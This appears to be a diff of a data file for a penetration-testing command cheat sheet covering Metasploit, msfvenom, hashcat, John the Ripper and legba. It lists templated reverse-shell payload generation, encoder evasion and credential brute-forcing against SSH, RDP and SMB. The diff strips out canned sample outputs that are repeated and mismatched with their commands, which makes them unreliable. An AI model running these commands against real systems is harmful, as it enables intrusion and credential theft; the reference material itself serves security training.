-<html><head><title>Site</title></head><body>...</body></html>'
     ]
   },
   {
@@ -770,14 +218,6 @@ Content-Length: 12345
       { title: 'burp — Save project', desc: 'Save session state', diff: 'medium', code: 'Project options -> Save project' },
       { title: 'burp — Search traffic', desc: 'Search across all captured data', diff: 'medium', code: 'Ctrl+Shift+F' },
       { title: 'burp — Copy as curl', desc: 'Export request as cURL command', diff: 'easy', code: 'Copy -> Copy as curl command' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
-<html><head><title>Site</title></head><body>...</body></html>'
       { title: 'burp — Sitemap', desc: 'Visualize app structure', diff: 'medium', code: 'Target -> Site map' },
       { title: 'burp — Logger', desc: 'Centralized traffic audit log', diff: 'medium', code: 'Logger tab' },
       { title: 'burp — Active scan', desc: 'Automated vulnerability scanning', diff: 'hard', code: 'Dashboard -> New Scan' },
@@ -789,381 +229,48 @@ Content-Length: 12345
     title: 'Exploitation Frameworks',
     commands: [
       { title: 'msfconsole — Start', desc: 'Launch Metasploit Framework', diff: 'easy', code: 'msfconsole' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Start (quiet)', desc: 'Launch without banner', diff: 'easy', code: 'msfconsole -q' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Search exploits', desc: 'Find modules by keyword', diff: 'easy', code: 'search <keyword>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Search with type', desc: 'Filter by module type', diff: 'medium', code: 'search type:exploit name:<keyword>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Use module', desc: 'Select exploit/aux module', diff: 'easy', code: 'use <module_path>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show options', desc: 'View module parameters', diff: 'easy', code: 'show options' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set option', desc: 'Configure module parameter', diff: 'easy', code: 'set <option> <value>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set global', desc: 'Set option across all modules', diff: 'medium', code: 'setg <option> <value>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Unset global', desc: 'Remove global variable', diff: 'medium', code: 'unsetg <option>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set RHOSTS', desc: 'Define target IP', diff: 'easy', code: 'set RHOSTS <target>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set RPORT', desc: 'Define target port', diff: 'easy', code: 'set RPORT <port>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set payload', desc: 'Choose payload to deliver', diff: 'medium', code: 'set PAYLOAD <payload_path>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set LHOST', desc: 'Local IP for reverse connection', diff: 'easy', code: 'set LHOST <ip>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set LPORT', desc: 'Local port for callback', diff: 'easy', code: 'set LPORT <port>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Run exploit', desc: 'Execute the selected module', diff: 'easy', code: 'run' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Check target', desc: 'Test if target is vulnerable', diff: 'medium', code: 'check' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show payloads', desc: 'List compatible payloads', diff: 'medium', code: 'show payloads' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show encoders', desc: 'List available encoders', diff: 'medium', code: 'show encoders' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show auxiliary', desc: 'List auxiliary modules', diff: 'medium', code: 'show auxiliary' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show post', desc: 'List post-exploitation modules', diff: 'medium', code: 'show post' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Sessions list', desc: 'View all active sessions', diff: 'easy', code: 'sessions -l' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Interact session', desc: 'Connect to session by ID', diff: 'easy', code: 'sessions -i <session_id>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Kill session', desc: 'Terminate session', diff: 'medium', code: 'sessions -k <session_id>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Background session', desc: 'Send session to background', diff: 'medium', code: 'background' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Run post module', desc: 'Execute post-exploit module', diff: 'hard', code: 'run <post_module_path>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Add route', desc: 'Route traffic through session for pivoting', diff: 'hard', code: 'route add <subnet> <session_id>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Show routes', desc: 'Display active pivot routes', diff: 'medium', code: 'route' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Set session pivot', desc: 'Route through existing session', diff: 'hard', code: 'setg SESSION <session_id>' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfconsole — Exit', desc: 'Close Metasploit', diff: 'easy', code: 'exit' },
-  output: '
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
-msf6 > set LHOST 10.10.14.5
-msf6 > exploit
-[*] Meterpreter session 1 opened
-meterpreter > sysinfo
-Computer: WEBSERVER-01
-OS: Windows Server 2022'
       { title: 'msfvenom — List payloads', desc: 'Show all available payloads', diff: 'easy', code: 'msfvenom -l payloads' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — List encoders', desc: 'Show available encoders', diff: 'easy', code: 'msfvenom -l encoders' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — List formats', desc: 'Show output format options', diff: 'easy', code: 'msfvenom -l formats' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — List platforms', desc: 'Show target platform options', diff: 'easy', code: 'msfvenom -l platforms' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — List archs', desc: 'Show architecture options', diff: 'easy', code: 'msfvenom -l archs' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Encode payload', desc: 'Encode with iterations for evasion', diff: 'hard', code: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e <encoder> -i <iterations> -f <format> -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Specify platform', desc: 'Set target OS for payload', diff: 'medium', code: 'msfvenom -p <payload> --platform <platform> -a <arch> LHOST=<ip> LPORT=<port> -f <format> -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Linux reverse shell', desc: 'Generate Linux ELF payload', diff: 'medium', code: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Windows meterpreter', desc: 'Windows reverse meterpreter', diff: 'medium', code: 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Web PHP shell', desc: 'PHP reverse shell', diff: 'medium', code: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Python payload', desc: 'Python reverse shell', diff: 'medium', code: 'msfvenom -p python/shell_reverse_tcp LHOST=<ip> LPORT=<port> -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — macOS payload', desc: 'macOS reverse shell', diff: 'hard', code: 'msfvenom -p osx/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'msfvenom — Android payload', desc: 'Android APK meterpreter', diff: 'hard', code: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o <output>' },
-  output: '
-[-] No platform selected, choosing Windows
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: payload.exe'
       { title: 'searchsploit', desc: 'Search Exploit-DB locally', diff: null, code: 'searchsploit <keyword>' },
-  output: '
-------------------------------------------
- Exploit Title                     | Path
-------------------------------------------
-Apache 2.4.49 Path Traversal       | exploits/multiple/webapps/50405
-WordPress 5.7 User Enumeration     | exploits/php/webapps/50000
-------------------------------------------'
     ]
   },
   {
@@ -1172,194 +279,32 @@ WordPress 5.7 User Enumeration     | exploits/php/webapps/50000
     title: 'Password Cracking',
     commands: [
       { title: 'hashcat — Dictionary attack', desc: 'MD5 with wordlist (-a 0)', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Brute force', desc: 'Exhaustive mask attack (-a 3)', diff: 'hard', code: 'hashcat -m <hash_type> -a 3 <hashes> <mask>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Combination', desc: 'Combine two wordlists (-a 1)', diff: 'hard', code: 'hashcat -m <hash_type> -a 1 <hashes> <wordlist1> <wordlist2>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Rule-based', desc: 'Dictionary with mangling rules', diff: 'hard', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> -r <rule_file>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Hybrid wordlist+mask', desc: 'Wordlist + mask suffix (-a 6)', diff: 'hard', code: 'hashcat -m <hash_type> -a 6 <hashes> <wordlist> <mask>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — NTLM', desc: 'Windows NTLM hash (-m 1000)', diff: 'medium', code: 'hashcat -m 1000 -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — bcrypt', desc: 'Slow hash, low speed (-m 3200)', diff: 'hard', code: 'hashcat -m 3200 -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — MD5', desc: 'MD5 hash (-m 0)', diff: 'easy', code: 'hashcat -m 0 -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — SHA1', desc: 'SHA1 hash (-m 100)', diff: 'medium', code: 'hashcat -m 100 -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — SHA256', desc: 'SHA256 hash (-m 1400)', diff: 'medium', code: 'hashcat -m 1400 -a 0 <hashes> <wordlist>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Show cracked', desc: 'Display previously cracked hashes', diff: 'easy', code: 'hashcat -m <hash_type> <hashes> --show' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Benchmark', desc: 'Speed test for hash mode', diff: 'easy', code: 'hashcat -b -m <hash_type>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Session save', desc: 'Name session for later resume', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --session=<name>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Resume session', desc: 'Restore saved session', diff: 'medium', code: 'hashcat --session=<name> --restore' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Increment mode', desc: 'Try shorter masks first', diff: 'hard', code: 'hashcat -m <hash_type> -a 3 <hashes> <mask> --increment' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Custom charset', desc: 'Define custom character set (-1)', diff: 'hard', code: 'hashcat -m <hash_type> -a 3 <hashes> -1 <charset> <mask>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Save output', desc: 'Write cracked to file (-o)', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> -o <output>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Remove cracked', desc: 'Show only uncracked hashes', diff: 'medium', code: 'hashcat -m <hash_type> <hashes> --show --left' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Workload', desc: 'Set performance profile (-w)', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> -w <level>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Force', desc: 'Override warnings and errors', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --force' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Quiet mode', desc: 'Suppress status output', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --quiet' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Status timer', desc: 'Status update interval in seconds', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --status-timer=<seconds>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — GPU select', desc: 'Use specific GPU device (-d)', diff: 'hard', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> -d <device_id>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Potfile disable', desc: 'Skip potfile reads/writes', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --potfile-disable' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Runtime limit', desc: 'Max cracking time in seconds', diff: 'medium', code: 'hashcat -m <hash_type> -a 0 <hashes> <wordlist> --runtime=<seconds>' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Example hashes', desc: 'Show sample hashes for mode', diff: 'easy', code: 'hashcat -m <hash_type> --example-hashes' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
       { title: 'hashcat — Version', desc: 'Display version info', diff: 'easy', code: 'hashcat --version' },
-  output: '
-Session..........: hashcat
-Status...........: Running
-Hash.Mode........: 0 (MD5)
-Speed.#1.........: 14250.3 MH/s
-Recovered........: 2/5 (40%) Digests'
     ]
   },
   {
@@ -1398,12 +343,6 @@ Recovered........: 2/5 (40%) Digests'
       { title: 'legba — HTTP POST form', desc: 'Custom POST form brute-force', diff: 'hard', code: 'legba http -T <url> --http-method POST --http-payload "Username={{USERNAME}}&Password={{PASSWORD}}" --http-success "status == 302" -U <user_file> -P <password_file>' },
       { title: 'legba — HTTP Basic Auth', desc: 'Brute-force HTTP Basic Auth', diff: 'medium', code: 'legba http-basic -T <target> -U <user> -P <password_file>' },
       { title: 'legba — SSH', desc: 'Brute-force SSH password', diff: 'medium', code: 'legba ssh -T <target> -U <user> -P <password_file>' },
-  output: '
-The authenticity of host 10.10.10.1 can be established.
-ED25519 key fingerprint: SHA256:abc123...
-user@10.10.10.1 password:
-Linux webserver 5.15.0-86-generic
-user@webserver:~$'
       { title: 'legba — FTP', desc: 'Brute-force FTP credentials', diff: 'medium', code: 'legba ftp -T <target> -U <user> -P <password_file>' },
       { title: 'legba — SMB', desc: 'Brute-force SMB authentication', diff: 'medium', code: 'legba smb -T <target> -U <user> -P <password_file>' },
       { title: 'legba — RDP', desc: 'Brute-force Remote Desktop', diff: 'hard', code: 'legba rdp -T <target> -U <user> -P <password_file>' },
@@ -1424,201 +363,47 @@ user@webserver:~$'
     title: 'Password — John the Ripper',
     commands: [
       { title: 'john — Wordlist mode', desc: 'Crack hashes with wordlist', diff: 'medium', code: 'john --wordlist=<wordlist> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Rules enabled', desc: 'Wordlist with mangling rules', diff: 'hard', code: 'john --rules --wordlist=<wordlist> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Single crack', desc: 'Single crack mode (login-based)', diff: 'hard', code: 'john --single <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Incremental', desc: 'Brute-force all combos', diff: 'hard', code: 'john --incremental <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Incremental digits', desc: 'Numeric-only brute force', diff: 'hard', code: 'john --incremental=Digits <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Mask attack', desc: 'Custom pattern mask', diff: 'hard', code: 'john --mask=<mask> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Show cracked', desc: 'Display cracked passwords', diff: 'easy', code: 'john --show <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Session save', desc: 'Name session for resume', diff: 'medium', code: 'john --session=<name> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Restore session', desc: 'Resume saved session', diff: 'medium', code: 'john --restore=<name>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Session status', desc: 'Check session progress', diff: 'medium', code: 'john --status=<name>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Fork (parallel)', desc: 'Run N parallel processes', diff: 'hard', code: 'john --fork=<N> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Format list', desc: 'List supported hash formats', diff: 'easy', code: 'john --list=formats' },
-  output: '
